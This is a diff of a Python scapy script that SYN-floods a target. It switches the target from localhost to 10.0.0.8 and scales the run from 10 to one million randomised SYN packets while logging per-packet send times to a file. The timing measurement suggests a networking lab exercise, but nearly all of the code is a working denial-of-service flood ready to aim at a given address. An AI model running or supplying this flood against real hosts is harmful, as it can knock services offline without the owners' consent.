@@ -3,7 +3,7 @@ from scapy.all import IP, TCP, send, sniff
 from random import randint
 
 # initialize global variables:
-TARGET_IP = "127.0.0.1"
+TARGET_IP = "10.0.0.8"
 TARGET_PORT = 9000
 FILE_NAME = "syns_result_p.txt"
 
@@ -19,7 +19,7 @@ def randInt():
 
 
 def create_syn_packet():
-    #define the source variables
+    # define the source variables
     s_port = randInt()
     s_eq = randInt()
     w_indow = randInt()
@@ -42,50 +42,56 @@ def create_syn_packet():
 
 
 def syn_flood():
-    #open a file in write mode in order to save the packet's data
+    # open a file in write mode in order to save the packet's data
     file = open(FILE_NAME, 'w')
-    #define a times array - for calculating the avg time
+    # define a times array - for calculating the avg time
     times = []
-    
+
     print("Packets are sending ...")
-    
-    #send 1000000 packets to the target
-    for index in range(0, 10):
-        # start the timer - in order to calculate the build packet time
-        start = time.time()*1000
 
-        # build the syn packet
-        synPacket = create_syn_packet()
-    
-        # send the packet to the target
-        send(synPacket)
-        # send(synPacket, verbose=0)
+    # send 1000000 packets to the target
+    index = 0
+    for _ in range(0, 100):
+        for _ in range(0, 10000):
+            # start the timer - in order to calculate the build packet time
+            start = time.time()*1000
 
-        # after sending the packet - close the the timer
-        end = time.time()*1000
-        # calculate the sent packet time
-        sentTime = end - start
+            # build the syn packet
+            synPacket = create_syn_packet()
 
-        # add the sent time to the array
-        times.append(sentTime)
+            # send the packet to the target
+            send(synPacket)
+            # send(synPacket, verbose=0)
 
-        # add the packet data to the file
-        textToFile = "Packet number: " + \
-            str(index) + " time: " + str(sentTime) + "(ms)\n"
-        file.write(textToFile)
-        
+            # after sending the packet - close the the timer
+            end = time.time()*1000
+            # calculate the sent packet time
+            sentTime = end - start
+
+            # add the sent time to the array
+            times.append(sentTime)
+
+            # add the packet data to the file
+            textToFile = "Packet number: " + \
+                str(index) + " time: " + str(sentTime) + "(ms)\n"
+            file.write(textToFile)
+
+            # increase the index
+            index += 1
+
     # calculate the avg time that took to send a packet
     sumTime = 0
     for dataTime in times:
         sumTime += dataTime
     avgTime = sumTime/len(times)
-    
+
     # add the avg time to the file
     textToFile = "\nThe average time to send a syn packet in python is: " + \
         str(avgTime) + "(ms)"
     file.write(textToFile)
-    
-    #close the file
+
+    # close the file
     file.close()
+
 
 syn_flood()
